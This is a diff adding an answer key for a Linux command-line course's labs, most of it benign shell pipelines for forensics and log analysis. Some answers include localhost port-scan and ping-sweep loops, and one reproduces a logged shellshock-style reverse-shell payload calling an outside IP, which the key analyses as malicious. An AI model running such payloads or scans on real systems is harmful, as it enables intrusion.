@@ -1,0 +1,1098 @@
+"Directory Jeopardy!"
+(Lab for Section 1, "Getting Around")
+=====================================
+
+1.    cp /etc/passwd /tmp             # use full absolute paths, works from anywhere
+      cd /etc; cp passwd /tmp         # use relative path from /etc, absolute path to /tmp
+      cd /etc; cp passwd ../tmp       # both paths relative from /etc
+      cd /tmp; cp /etc/passwd .       # go to /tmp, cp absolute path to current directory
+      cd /tmp; cp ../etc/passwd .     # use relative paths from /tmp
+      cd /; cp etc/passwd tmp         # use relative paths from the root
+
+2. You would be in "/", the root of the file system. All of the "/.."s at the end of the
+   command are going to guarantee that.
+
+3. You should be in "/home". Everything before the second-to-last command, "cd", is really
+   irrelevant since that command brings you to your home directory wherever you are.
+   "cd .." from there should take you to "/home".
+
+4. "cd /v<Tab>r<Tab>N<Tab>s<Tab><Return>" -- 13 keystrokes by my count! Typing out every letter
+   in the full command is 47 keystrokes and you'd probably make a typo somewhere along the way!
+
+5. "We the people in order to form a more perfect union is the beginning of the preamble of the
+    United States Constitution which is stored in the National Archives in Washington DC"
+
+
+
+"Only Seven Commands? No Worries!"
+(Lab for Section 2, "Basic Commands")
+=====================================
+
+1. Answers will vary depending on your system, but here's how to find the answers:
+
+      Sort files by their modification date with "ls -lAt /var/log", then pick the newest and the oldest
+          from the bottom/top of the listing
+      Sort the directory by size with "ls -lAS /var/log"-- this will give you the sizes in bytes for the
+          smallest and biggest files. "ls -lASh /var/log" will show you file sizes in megabytes, gigabytes, etc.
+
+2. The command is "mkdir"
+
+3. "mkdir -p /tmp/fee/fie/fo/fum" -- the trick is the "-p" option that lets you create directories
+   as deeply as you want to
+
+4. There are many different ways to accomplish this-- here's one method:
+
+       cd ~/Exercises/Targets/Pictures
+       mkdir ~/Pictures/GIF
+       cp *.gif ~/Pictures/GIF
+       mkdir ~/Pictures/JPG
+       cp *.jpg *.jpeg ~/Pictures/JPG
+       mdir ~/Pictures/PNG
+       cp *.png ~/Pictures/PNG
+
+5. If you search backwards, you will probably encounter the commands in this order:
+
+       echo help! i need somebody!
+       echo Helping helps the helper and the helpee
+       echo Look for the helpers. You will always find people helping.
+
+6. The commands are:
+
+       echo I am only here because I had a lot of help along the way
+       echo I get by with a little help from my friends
+       echo Some days it's filet mignon and other days it's hamburger helper
+
+7. Run "less ~/.bash_history". Once the file is open, type "/help" to search forward through the file
+   for the word "help".
+   
+
+"Learning to Linux"
+(Lab for Section 3, "Building Blocks")
+======================================
+
+1. "grep -rl sockaddr_in /usr/include" -- the exact list of files output may vary depending on which Linux
+   distro you are using, what packages you have installed, etc.
+
+2. "grep -rl sockaddr_in /usr/include | wc -l" -- again the exact count of files may vary for each student
+
+3. The "Targets/Pictures" directory is randomly generated so your numbers may not match exactly:
+
+        $ ls Targets/Pictures/ | wc -l
+        988
+
+4. The "Targets/Pictures" directory is randomly generated so your numbers may not match exactly:
+
+        $ ls Targets/Pictures/ | cut -d. -f2 | sort | uniq -c
+            213 gif
+            103 jpeg
+            207 jpg
+            465 png
+        $ ls ~/Pictures/GIF | wc -l
+        213
+        $ ls ~/Pictures/JPG | wc -l
+        310
+        $ ls ~/Pictures/PNG | wc -l
+        465
+
+5. A natural approach would be something like this:
+
+        $ md5sum Targets/Pictures/* | awk '{print $1}' | sort -u
+        854fba5778d3454b7c631be00dacbf93
+        88918a6753e0b70cea00db875e219195
+        f0a372b4bb014f41dd60fd5c2158000f
+        f8158fbfba9a0e0d525a8365380149f9
+
+   Yes, there are really only four different files that make up the hundreds of files in the directory.
+
+   One cool feature of "sort", however, is that the "-u" option understands making things unique based
+   on one or more individual fields on the line (which is something you can't do with "uniq"). So this
+   approach also works:
+
+        $ md5sum Targets/Pictures/* | sort -u -k1,1
+        854fba5778d3454b7c631be00dacbf93  Targets/Pictures/002.jpg
+        88918a6753e0b70cea00db875e219195  Targets/Pictures/031.png
+        f0a372b4bb014f41dd60fd5c2158000f  Targets/Pictures/006.gif
+        f8158fbfba9a0e0d525a8365380149f9  Targets/Pictures/000.png
+
+   The bonus to this approach is that you get the name of a sample file to look at for each checksum.
+
+6. Your numbers are likely to vary, even if you are using the same Linux distro as I am:
+
+        $ ps -ef | awk '{print $1}' | sort | uniq -c | sort -nr
+            240 root
+             71 lab
+              2 avahi
+              1 UID
+              1 rtkit
+              1 rpc
+              1 polkitd
+              1 libstor+
+              1 dnsmasq
+              1 dbus
+              1 colord
+              1 chrony
+
+7. The solution I showed in class was to use "tail -n +2" to skip over the initial header line:
+
+        $ ps -ef | tail -n +2 | awk '{print $1}' | sort | uniq -c | sort -nr
+            240 root
+             72 lab
+              2 avahi
+              1 rtkit
+              1 rpc
+              1 polkitd
+              1 libstor+
+              1 dnsmasq
+              1 dbus
+              1 colord
+              1 chrony
+
+   Or you could check out the manual page for "ps". It turns out that the Linux "ps" command has a
+   "--no-header" option which we could use instead:
+
+        $ ps -ef --no-header | awk '{print $1}' | sort | uniq -c | sort -nr
+            240 root
+             72 lab
+              2 avahi
+              1 rtkit
+              1 rpc
+              1 polkitd
+              1 libstor+
+              1 dnsmasq
+              1 dbus
+              1 colord
+              1 chrony
+
+8. The problem with "sort -n" is that it treats the first two octets like a decimal number. This leads
+   to an incorrect sorting.
+
+   The traditional method has been to treat each octet as a field to be sorted numerically:
+
+        sort -n -t. -k1,1 -k2,2 -k3,3 -k4,4 Targets/ip_addrs
+
+   This approach should work on pretty much any flavor of Unix or Linux you find yourself on.
+   
+   However the Linux "sort" command has added a "-V" (aka "--version-sort") option which accomplishes the
+   same output:
+
+        sort -V Targets/ip_addrs
+
+9. Use "head" to extract the first 25 lines, then "tail" to output only the final line:
+
+        $ head -25 Targets/numbered_lines | tail -1
+        this is line 25
+
+   You can extract any line you want from the file, just by changing the initial argument to "head".
+
+10. Use awk's pattern matching to only match lines that contain "curl/". The trick here is that we have to
+    write that as "/curl\//" in the pattern match so that our trailing "/" doesn't mess things up.
+    The rest is the "... | sort | uniq -c | sort -nr" idiom I used in the slides to create a histogram.
+    
+        $ awk '/curl\// {print $1}' Targets/access_log-hudak | sort | uniq -c | sort -nr
+             80 116.202.187.77
+             72 45.33.65.249
+             24 113.98.117.244
+             23 185.247.225.61
+             22 116.22.197.111
+             21 193.32.127.156
+             14 5.183.209.217
+             12 176.10.99.200
+              8 85.132.252.37
+              5 64.233.202.242
+            [...]
+
+
+11. The answer is actually a simple command:  "sort -u -k2 Targets/psscan-output"
+    This tells "sort" to output unique lines using the content from field #2 to the end of the line,
+    effectively ignoring the first column.
+
+
+"Redirect This!"
+(Lab for Section 4, "Output Redirection")
+=========================================
+
+1. echo $(( $RANDOM % 255 )).$(( $RANDOM % 255 )).$(( $RANDOM % 255 )).$(( $RANDOM % 255 ))
+   Not super elegant, but it works!
+
+2. "cp" is just copying the contents of one file to another. "cat /etc/passwd >/tmp/passwd" is essentially the
+   same thing as "cp /etc/passwd /tmp/passwd". Or if you wanted to go crazy with the output redirection you could
+   "cat </etc/passwd >/tmp/passwd".
+
+3. Let's just look at what the list of duplicate UIDs is first:
+
+        $ cut -d: -f3 Targets/passwd | sort | uniq -d
+	0
+	1000
+
+   The fact that one of the duplicate UIDs is zero is a problem, because "grep" is going to match that
+   zero anywhere in the line. So we get way more output than we wanted:
+
+        $ grep -f <(cut -d: -f3 Targets/passwd | sort | uniq -d) Targets/passwd
+	root:x:0:0:root:/root:/bin/bash
+	games:x:5:60:games:/usr/games:/usr/sbin/nologin
+	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+	gotroot:x:0:0:boo!:/tmp:/bin/bash
+	systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+	systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+	systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+	evilhal:x:1000:1000:not me:/tmp:/bin/bash
+	messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+	syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+	_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+	tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+	uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+	tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+	sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+	landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+	hal:x:1000:1000:,,,:/home/hal:/bin/bash
+
+    Turns out that "grep" has a "-w" option which means "match only whole words". So our "0" would have to be
+    surrounded by non-word (punctuation) characters. That's exactly what we need in this case:
+
+        $ grep -w -f <(cut -d: -f3 Targets/passwd | sort | uniq -d) Targets/passwd
+	root:x:0:0:root:/root:/bin/bash
+	gotroot:x:0:0:boo!:/tmp:/bin/bash
+	evilhal:x:1000:1000:not me:/tmp:/bin/bash
+	hal:x:1000:1000:,,,:/home/hal:/bin/bash
+
+    Boo-yah!
+
+4. First command:
+
+        $ grep -rl LAB /etc >/tmp/output 2>&1
+
+   STDOUT goes into /tmp/output and so does STDERR. No problems!
+
+   Now let's swap the output redirections and see what happens:
+
+        $ grep -rl LAB /etc 2>&1 >/tmp/output
+	grep: /etc/crypttab: Permission denied
+	grep: /etc/ssh/sshd_config: Permission denied
+	grep: /etc/ssh/ssh_host_ed25519_key: Permission denied
+	grep: /etc/ssh/ssh_host_ecdsa_key: Permission denied
+	[...]
+
+   Hmmm, the STDOUT is going into /tmp/output but not STDERR. This is the weird corner case where the order
+   of the output redirection matters. At the time we send STDERR to STDOUT, the STDOUT is still heading to
+   the terminal. *After* that we send STDOUT to /tmp/output, but that does not change STDERR still going to
+   the terminal. Surprise!
+
+5. Let's see the magic first and then get to the explanation
+
+        $ grep -f <(awk '/curl\// {print $1}' Targets/access_log-hudak | sort -u) Targets/access_log-hudak |
+	       awk '!/curl\// {print $1}' | sort | uniq -c | sort -nr
+             88 179.43.175.6
+             15 113.98.117.244
+              9 8.214.10.218
+              9 47.98.226.15
+              9 47.90.255.86
+              9 121.43.53.157
+              9 112.74.85.142
+	      [...]
+
+    "awk '/curl\// {print $1}' Targets/access_log-hudak | sort -u" gets a list of unique IPs that used curl.
+    "<(...)" allows us to use that list of IPs as a pattern file for grep to search on-- this gets us all the
+    lines matching those IPs. Many of those lines have curl as the User Agent, but some might not. So we plow
+    all of that output into awk and this time IGNORE the lines with "curl/" and only output the IP addresses
+    from lines that don't contain this string.
+      
+
+
+"Get in the Loop"
+(Lab for Section 5, "Loops")
+============================
+
+1. In the labs for the last section, Question #1 shows how to output a single random IP address.
+   All we have to do is wrap that up in a loop and save the output someplace:
+
+        for i in {1..1000}; do
+	    echo $(( $RANDOM % 255 )).$(( $RANDOM % 255 )).$(( $RANDOM % 255 )).$(( $RANDOM % 255 ))
+	done >test-ips
+
+   Notice the output redirection at the end of the loop to save the output into a file.
+
+2. The trick for calculating the length of each line is to echo the line into "wc -c". After that it's just
+   a matter of getting the output correct. You'll notice we're careful to use quotes when we're doing the output.
+   Try the loop with and without the quotes and compare the "OPTIONS" lines in each output to see why.
+
+        cat Targets/access_log-champlain | while read line; do
+            len=$(echo $line | wc -c)
+            echo -e "$len\\t$line"
+        done
+
+3. We just need to add a numeric sort and a "head" or "tail" (depending on sort order you chose). I'm going to
+   use an ascending sort and tail so the longest lines are last in my ouput-- right above my next shell prompt.
+
+        $ cat Targets/access_log-champlain | while read line; do
+            len=$(echo $line | wc -c)
+            echo -e "$len\\t$line"
+        done | sort -n | tail
+	[... output not shown ...]
+	1760    192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] "POST /jabc/?q=user/password&name%5b%23post_render...
+        1779    192.168.210.131 - - [05/Oct/2019:13:01:29 +0200] "POST /jabc/?q=user/password&name%5b%23post_render...
+
+   If you Google for something like "web exploit post_render", you'll probably get some hits for the "Drupalgeddon2"
+   exploit (CVE-2018-7600). You could always do further decoding with CyberChef, but we'll look at some command-line
+   tools for doing this later in the course.
+
+4. There are five fields on each line but we are really only interested in the names in fields two and four.
+   A "while read ..." loop makes this straightforward:
+
+        cat Targets/names | while read rank male count female count; do
+	    echo $male
+	    echo $female
+	done | sort >namelist
+
+   The loop just outputs the names in the order they appear in the file. After the loop we throw in a "sort"
+   to alphabetize the list before saving it to a file with output redirection.
+
+5. You'll need to use two loops, one inside the other:
+
+        for i in {1..12}; do
+            for j in {1..12}; do
+                echo -ne $(($i*$j))\\t
+            done
+            echo
+        done
+
+   The trickiest part here is probably getting the formatting right. Use "echo -ne" in the innermost loop
+   to output the number followed by a tab, but no newline. We wait until the inner loop outputs each line
+   of our multiplication table and then use that trailing "echo" command to output the newline and start again.
+
+
+"Choose Your Own Adventure"
+(Lab for Section 6, "Conditionals")
+===================================
+
+1. [[ $(( $RANDOM % 2 )) -eq 0 ]] && echo heads || echo tails
+
+2. Here's one approach and some sample output:
+
+        $ echo hello >/dev/tcp/localhost/22 && echo port open || echo port closed
+        port open
+        $ echo hello >/dev/tcp/localhost/23 && echo port open || echo port closed
+        -bash: connect: Connection refused
+        -bash: /dev/tcp/localhost/23: Connection refused
+        port closed
+
+3. Rather than getting rid of the error output from each command inside the loop, it's faster and easier to
+   redirect STDERR at the end of the loop:
+
+        $ for port in {1..1024}; do
+	      echo >/dev/tcp/localhost/$port && echo $port/tcp open
+	  done 2>/dev/null
+        22/tcp open
+        111/tcp open
+        631/tcp open
+
+4. This one turned out to be less straightforward than I expected. I really wanted this to work, but it doesn't:
+
+        for file in {000..999}; do [[ ! -f $file.* ]] && echo $file missing; done
+
+   The wildcard doesn't work properly in the context of "-f"
+
+   After some trial and error I settled on this:
+
+        cd Targets/Pictures
+        for file in {000..999}; do [[ -z $(ls $file.*) ]] && echo $file missing; done 2>/dev/null
+
+   We're now checking if "ls $file.*" returns nothing, which is what happens when the wildcard doesn't match.
+   Initially I tried it with "echo file.*", but that returns strings like '888.*' when there is nothing to
+   match the wildcard.
+
+5. Here's one approach:
+
+        IFS=,; cat Targets/maillog-oneline.csv | while read time sender recips subject attachment; do
+	     [[ "$subject" == "$attachment" ]] && echo $time,$sender,$recips,$subject,$attachment
+	done
+
+   Set "IFS=," to break each line up on the commas. It's easy then to break out the individual fields.
+   The only annoying part is having to put the line back together when we want to output something.
+
+
+"Find All the Things"
+(Lab for Section 7, "Other Iterators")
+======================================
+
+1. find /dev -type f
+
+2. You are allowed to specify multiple directories with find, so we can use the single command
+   "find /etc /var -name \*cron\*"
+
+3. First find all regular files under /tmp, /var/tmp, and /dev/shm. We don't know if we're going to
+   encounter spaces in file or directory names, but just to be on the safe side we'll use "-print0".
+   "xargs -0 md5sum" takes in the null delimited list of files and runs md5sum on all of them.
+   Then we just grep for files that match our checksum of interest. Note that the setup script that
+   was provided by the class should have created two instances of our "evil" shell script to find.
+
+        $ find /tmp /var/tmp /dev/shm -type f -print0 | xargs -0 md5sum | grep 9b114325e783b3b25f1918ca7b813bd4
+	9b114325e783b3b25f1918ca7b813bd4  /tmp/.ICEd-unix/.src.sh
+	9b114325e783b3b25f1918ca7b813bd4  /dev/shm/.. /.install/ewrBPFx.sh
+
+4. This is a rare case where we actually want to run "wc -c" on each individual file, so we use
+   "find ... -exec" rather than "find ... | xargs":
+   
+        # find /var/log -type f -exec wc -c {} \; | sort -nr | head -20
+        25165824 /var/log/journal/5ead3371ad294202a01d3df2b8fa4828/system.journal
+	[...]
+        916880 /var/log/messages-20220424
+        817926 /var/log/messages
+        728534 /var/log/messages-20220409
+        689637 /var/log/anaconda/syslog
+        635334 /var/log/anaconda/packaging.log
+        601928 /var/log/dnf.log
+
+5. First let's get a list of all of the directories under /dev:
+
+        # cd /dev
+        # find * -type d >/tmp/dirlist
+        # head /tmp/dirlist
+	block
+	bsg
+	bus
+	bus/usb
+	bus/usb/002
+	[...]
+
+   Running the command from the /dev directory itself means that our directory paths are relative paths
+   without the leading /dev. That will make them easier to use later.
+
+   Now to replicate our directory structure:
+
+        # mkdir /tmp/newdev
+	# cd /tmp/newdev
+	# cat /tmp/dirlist | xargs mkdir
+	# find * -type d >/tmp/newdirlist
+	# diff /tmp/dirlist /tmp/newdirlist
+
+   We make /tmp/newdev and then "cd" into the directory. The magic is that we can then use the /tmp/dirlist file
+   we made from /dev as the input to "xargs mkdir" to create exactly the same directories in the new location.
+   For verification purposes I use the same "find" command to list the directory structure of the new location,
+   and then I use the "diff" command to compare the two lists. The fact that "diff" gives no output means the
+   files are identical.
+
+   There is some heavy command-line wizardry that could accomplish this mission without using an intermediate file
+   to store the directory tree:
+
+        # cd /dev
+	# mkdir /tmp/second-try
+	# find * -type d | (cd /tmp/second-try; xargs mkdir)
+
+   The parentheses create a "sub shell"-- a brand new shell environment separate from the one where we're running
+   "find" in /dev. In the new sub shell we "cd" into our target directory first, and then "xargs" begins reading
+   the output of "find" and making directories. Sub shells are great for tasks like this where you want to do some
+   processing in a different directory from where your main activity is going on.
+
+
+
+"Express Yourself"
+(Lab for Section 8, "Regular Expressions")
+==========================================
+
+1. In the good old days, we'd just run a "find ... | grep ..." pipeline like:
+
+        find /usr/share -type f | grep '\.lua$'
+
+   However, the Linux find command has added regex type searching, so we could also try:
+
+	find /usr/share -regextype egrep -regex '.*\.lua$'
+
+   Honestly I still prefer the first method. Also, you kids get off my lawn!
+
+2. I'm going to stick with my "find ... | grep ..." method:
+
+        $ find /usr/share | grep '\.lua$' | xargs dirname | sort -u
+	/usr/share/doc/lua-lpeg
+	/usr/share/grilo-plugins/grl-lua-factory
+	/usr/share/lua/5.3
+	/usr/share/lua/5.3/json
+	/usr/share/lua/5.3/json/decode
+	/usr/share/lua/5.3/json/encode
+	/usr/share/lua/5.3/lxp
+	/usr/share/lua/5.3/socket
+	/usr/share/nmap
+	/usr/share/nmap/nselib
+	/usr/share/nmap/nselib/data
+	/usr/share/nmap/nselib/data/psexec
+
+   Your exact output may vary depending on the packages installed on your system.
+
+3. "[A-Z][a-z][a-z] +[0-9]+ +[0-9]+:[0-9]+:[0-9]+"
+
+4. "\[[0-9]+/[A-Z][a-z][a-z]/[0-9]+:[0-9]+:[0-9]+:[0-9]+ [-+][0-9]+\]"
+
+5. Our commands should go something like:
+
+        $ zcat Targets/hudak-unalloc.gz | strings -a >/tmp/hudak-strings
+        $ egrep '[A-Z][a-z][a-z] +[0-9]+ +[0-9]+:[0-9]+:[0-9]+' /tmp/hudak-strings
+        [...]
+        Dec  2 23:46:02 ApacheWebServer CRON[8178]: (root) CMD (/root/.remove.sh)
+        Dec  2 23:47:02 ApacheWebServer CRON[9062]: (root) CMD (/root/.remove.sh)
+        Dec  2 23:47:42 ApacheWebServer python3[27371]: 2021-12-02T23:47:42.556826Z INFO ExtHandler ExtHandler Checking...
+        $ egrep '\[[0-9]+/[A-Z][a-z][a-z]/[0-9]+:[0-9]+:[0-9]+:[0-9]+ [-+][0-9]+\]' /tmp/hudak-strings
+
+   We find lots of old Syslog style logs but no Apache logs in unallocated. You can verify your regex
+   against the supplied access_log though:
+
+        $ egrep '\[[0-9]+/[A-Z][a-z][a-z]/[0-9]+:[0-9]+:[0-9]+:[0-9]+ [-+][0-9]+\]' Targets/access_log-hudak
+        108.248.66.207 - - [06/Oct/2021:19:42:41 +0000] "GET / HTTP/1.1" 200 45
+        108.248.66.207 - - [06/Oct/2021:19:42:41 +0000] "GET /favicon.ico HTTP/1.1" 404 196
+        108.248.66.207 - - [06/Oct/2021:19:43:32 +0000] "-" 408 -
+        [...]
+
+6. The shell can make it tricky to deal with multi-line output. In this case, my approach was to just keep using 
+   'echo -n "$line "' to keep appending lines to each other (notice that there's a trailing space in "$line " so
+   that we have spaces between the recipients). When we hit a timestamp at the beginning of a line, first output
+   a newline to close off the previous line, and then keep going with the "echo -n..." stuff. We need one final
+   "echo" command after the loop is over to make sure the last line has a newline at the end.
+
+        cat Targets/maillog.csv | while read line; do
+	    [[ $line =~ ^\"2022-04- ]] && echo
+	    echo -n "$line "
+	done
+	echo
+
+
+
+"Transformers"
+(Lab for Section 9, "AWK/sed/tr")
+=================================
+
+1. The awk approach is definitely simpler. Use "-F," to split on commas instead of spaces and then just compare
+   fields four and five. "{print}" is the default action so we don't even explicitly have to tell awk to output
+   the line.
+
+        awk -F, '$4 == $5' Targets/maillog-oneline.csv
+
+2. Things may look a little different depending on your flavor of Linux, but here's the basic idea:
+
+        $ cat /proc/1/cmdline | tr \\000 ' '; echo
+        /usr/lib/systemd/systemd --switched-root --system --deserialize 18
+
+   I threw an extra "echo" onto the end there to add a newline and make the output easier to read.
+
+3. Again things may look a little different depending on your flavor of Linux:
+
+        $ cat /proc/1/environ | tr \\000 \\n
+        cat: /proc/1/environ: Permission denied
+        $ sudo cat /proc/1/environ | tr \\000 \\n
+        [sudo] password for lab:
+        HOME=/
+        TERM=linux
+	BOOT_IMAGE=(hd0,msdos1)/vmlinuz-4.18.0-305.7.1.el8_4.x86_64
+	crashkernel=auto
+
+4. Look at the solution and then we'll discuss the magic:
+
+        $ sed -E 's/([0-9]+).([0-9]+).([0-9]+).([0-9]+).in-addr.arpa domain name pointer/\4.\3.\2.\1/' Targets/host_ip_info
+	10.16.251.207 server1.srv.mydomain.net.
+	10.16.251.208 server2.srv.mydomain.net.
+	10.16.254.16 www.mydomain.net.
+	10.16.254.17 mydomain.com.
+
+    We match each of the four octets and all of the other text that isn't the hostname. Then we replace all
+    that noise with just the octets, but we have to reverse their order.
+
+5. You can ping a single host rapidly as follows:
+
+        $ ping -c 1 -w 1 192.168.10.135
+        PING 192.168.10.135 (192.168.10.135) 56(84) bytes of data.
+        64 bytes from 192.168.10.135: icmp_seq=1 ttl=64 time=0.634 ms
+
+        --- 192.168.10.135 ping statistics ---
+	1 packets transmitted, 1 received, 0% packet loss, time 0ms
+	rtt min/avg/max/mdev = 0.634/0.634/0.634/0.000 ms
+
+   "-c 1" says send a single packet, and "-w 1" means wait at most one second for a response. If we see
+   "1 received" on line five of the output then I want to output the IP address from line one.
+
+   This is where "tr" comes into play:
+
+        $ ping -c 1 -w 1 192.168.10.135 | tr \\n ' ' | awk '/1 received/ {print $2}'
+        192.168.10.135
+
+   "tr" converts the whole output to a single line and now we can use "awk" to output the IP address if
+   we get a response.
+
+   Pinging out an entire network just means wrapping the whole thing up in a loop:
+
+        $ for o in {1..254}; do
+	      ping -c 1 -w 1 192.168.10.$o | tr \\n ' ' | awk '/1 received/ {print $2}'
+	  done
+        192.168.10.2
+	192.168.10.132
+	192.168.10.135
+	[...]
+
+6. We can use the pattern "(.|%2e)" to represent each character of the "/../". And of course we need to put
+    "\/" in order to mean a literal "/" character in awk's pattern matching.
+
+        $ awk '/\/cgi-bin\/(.|%2e)(.|%2e)\// {print $1}' Targets/access_log-hudak | sort | uniq -c | sort -nr
+            115 141.135.85.36
+             80 116.202.187.77
+             69 203.175.13.24
+             55 45.146.164.110
+             54 62.76.41.46
+             50 109.237.96.124
+	     [...]
+
+7. All we have to do is add a check for '$9 == "200"' in addition to our pattern match from the previous problem:
+
+        $ awk '/\/cgi-bin\/(.|%2e)(.|%2e)\// && $9 == "200" {print $1}' Targets/access_log-hudak |
+	                                                                   sort | uniq -c | sort -nr
+            111 141.135.85.36
+             66 116.202.187.77
+             55 45.146.164.110
+             54 62.76.41.46
+             50 109.237.96.124
+             45 203.175.13.24
+	     [...]
+
+8. In a previous lab, we got the list of IPs that used curl, then used that as a list of patterns to extract
+   all log lines for those IPs. When we just wanted the IPs that also used something other than curl, we fed those
+   logs into awk, selected the non-curl lines and output their IPs.
+
+   But in this case we want both IP and User Agent string. The white space in the access_log User Agent field is
+   too irregular to rely on awk. So we use "fgrep -v curl/" to suppress the curl lines and then use sed to extract
+   just the IP and User Agent. The IP is the first thing on the line and the User Agent is the last quoted field
+   on the line. The sed expression ' ,*"([^"]+)"' says "gobble up everything up to the last double quote, followed
+   by stuff that's not a double quote (the User Agent string), followed by the final closing double quote".
+   We throw away all the junk we matched and just leave the User Agent string.
+
+   After that it's all just counting and sorting. We had to throw a little excitement into the final sort so that
+   it would sort on IP address first (field 2) and then count (field 1). Notice that you are allowed to specify
+   a reverse sort on a single field.
+
+        $ grep -f <(awk '/curl\// {print $1}' Targets/access_log-hudak | sort -u) Targets/access_log-hudak |
+	     fgrep -v curl/ | sed -E 's/ .*"([^"]+)"/ \1/' | sort | uniq -c | sort -n -k2,2 -k1,1r
+              5 8.214.10.218 -
+              4 8.214.10.218 Mozilla/5.0 (compatible;)
+              2 18.27.197.252 Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0
+              6 45.33.65.249 -
+              5 47.90.255.86 -
+              4 47.90.255.86 Mozilla/5.0 (compatible;)
+              [...]
+              1 219.94.246.47 () { :; }; /bin/bash -i >& /dev/tcp/202.61.199.103/15347 0<&1 2>&1
+
+   The last line of output is malicious. The first part is an incorrect function that's supposed to create a
+   "fork bomb" that fills up your process table. They got the syntax wrong though. The second part tries to
+   set up a reverse shell to 15347/tcp on 202.61.199.103 -- interestingly not the IP that launched the exploit.
+
+9. Breaking this down into pieces, first we have to extract the Unix epoch timestamp from each line.
+   Then we have to use "date" to convert it into a human-readable string. Finally we output everything:
+   
+        cat Targets/audit.log | while read line; do
+	    epoch=$(echo $line | sed -E 's/.*audit\(([0-9]+).*/\1/')
+	    date=$(date -d @$epoch "+%F %T")
+	    echo $date $line
+	done
+
+
+"Processing"
+(Lab for Section 10, "Processes")
+=================================
+
+1. "ps -eww -o start,user,pid,ppid,command"
+
+2. "ps -eww -o start,user,pid,ppid,command --sort=start"
+
+3. We'll do this one with /proc and save "lsof" for a later answer. So we start with the output of
+   "ls -l /proc/[0-9]*/exe" but we're really only interested in the lines that have a "->" pointing
+   to the executable path, which seems like a job for "fgrep":
+
+        # ls -l /proc/[0-9]*/exe 2>/dev/null | fgrep '->'
+        grep: invalid option -- '>'
+        Usage: grep [OPTION]... PATTERN [FILE]...
+        Try 'grep --help' for more information.
+
+   Nuts. "fgrep" sees our "->" pattern as an argument since it starts with "-". But there is no ">"
+   option to "fgrep" and so that's an error.
+
+   The workaround in these situations is to use "--" before our pattern. "--" tells most Linux commands
+   that the command line options are finished:
+
+        # ls -l /proc/[0-9]*/exe 2>/dev/null | fgrep -- '->' | sed 's/.* -> //' | sort -u
+	/dev/shm/.rk/lsof (deleted)
+	/dev/shm/.rk/xterm (deleted)
+	/usr/bin/bash
+	[...]
+
+   Now that "fgrep" is happy, we can use "sed" to throw away everything put the executable path name at
+   the end of the line, and then feed the resulting paths into "sort -u".
+
+   Right at the top of the output you see executable paths under /dev/shm/.rk, which is certainly not a
+   normal spot for those programs to be. The "(deleted)" marker also means that the binaries have been
+   deleted even though the programs are still running. This is definitely not a normal situation!
+
+4. Turns out you can recover the deleted executables just by using the /proc/<pid>/exe link:
+
+        # ls -l /proc/[0-9]*/exe 2>/dev/null | fgrep /dev/shm/.rk
+	lrwxrwxrwx. 1 lab    lab    0 May  1 11:16 /proc/187316/exe -> /dev/shm/.rk/lsof (deleted)
+	lrwxrwxrwx. 1 lab    lab    0 May  1 11:16 /proc/187324/exe -> /dev/shm/.rk/xterm (deleted)
+	# cp /proc/187316/exe /tmp/lsof-deleted
+	# cp /proc/187324/exe /tmp/xterm-deleted
+
+   Now that we have the executables, I'm going to search for system executables that match their
+   MD5 checksums:
+
+        # md5sum /tmp/lsof-deleted
+	eea6221f048f6e4b9163f038a2f7cd2f  /tmp/lsof-deleted
+	# find /bin /usr/bin -type f | xargs md5sum | fgrep eea6221f048f6e4b9163f038a2f7cd2f
+	eea6221f048f6e4b9163f038a2f7cd2f  /usr/bin/ncat
+
+	# md5sum /tmp/xterm-deleted
+ 	d033b60584afaabd447671d22b8fc985  /tmp/xterm-deleted
+	# find /bin /usr/bin -type f | xargs md5sum | fgrep d033b60584afaabd447671d22b8fc985
+	d033b60584afaabd447671d22b8fc985  /usr/bin/cat
+
+   So the program running as "lsof" was actually "ncat" (netcat), and "xterm" was just the "cat" program.
+
+5. OK, let's try our luck with "lsof" this time around. The current working directory path is the ninth
+   column of "lsof" output.
+
+        # lsof -d cwd | awk '{print $9}' | sort -u
+        lsof: WARNING: can't stat() fuse.gvfsd-fuse file system /run/user/1000/gvfs
+              Output information may be incomplete.
+        /
+	/dev/shm/.rk
+	/etc/avahi
+	/home/lab
+	NAME
+	/proc
+	/var/spool/at
+
+   We're seeing an annoying warning from "lsof"-- you can suppress this with the "-w" option.
+   The "NAME" output is from the "lsof" header. We could use "tail -n +2" to skip the header.
+
+        # lsof -w -d cwd | tail -n +2 | awk '{print $9}' | sort -u
+	/
+	/dev/shm/.rk
+	/etc/avahi
+	/home/lab
+	/proc
+	/var/spool/at
+
+   Again /dev/shm/.rk looks suspicious. Some of the other paths might look a little suspicious to you
+   as well, but it turns out these are typical for the flavor of Linux I'm running.
+
+6. Let's see what "lsof +L1" has to say:
+
+        # lsof -w +L1
+        COMMAND      PID    USER   FD   TYPE DEVICE SIZE/OFF NLINK     NODE NAME
+        auditd       975    root    4r   REG  253,0  9253600     0 34201374 /var/lib/sss/mc/passwd (deleted)
+        auditd       975    root   12r   REG  253,0  6940392     0 34201422 /var/lib/sss/mc/group (deleted)
+        udisksd     1012    root   16r   REG  253,0  9253600     0 34201374 /var/lib/sss/mc/passwd (deleted)
+        [...]
+
+   Oh my. It appears that there are many processes using deleted files on my system. They can't all be suspicious.
+   What if we just focus in on the suspicious "/dev/shm/.rk" directory we have already identified:
+
+        # lsof -w +L1 | fgrep /dev/shm/.rk
+        lsof      187316     lab  txt    REG   0,22   439368     0  2859945 /dev/shm/.rk/lsof (deleted)
+	xterm     187324     lab  txt    REG   0,22    38568     0  2860332 /dev/shm/.rk/xterm (deleted)
